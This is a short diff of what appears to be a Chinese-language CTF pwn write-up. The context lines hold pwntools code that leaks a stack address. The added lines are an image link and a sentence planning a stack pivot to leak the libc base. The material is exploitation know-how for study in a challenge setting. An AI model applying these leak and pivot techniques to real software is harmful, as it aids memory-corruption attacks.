@@ -227,6 +227,8 @@ p.recvuntil(b'ac')
 stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
 log.success('stack_addr: ' + hex(stack_addr))
 ```
+![[Pasted image 20250211193005.png]]
+第四步，泄露了stack段后开始着手构造栈迁移来泄漏libc基址。
 
 
 ## unjoke
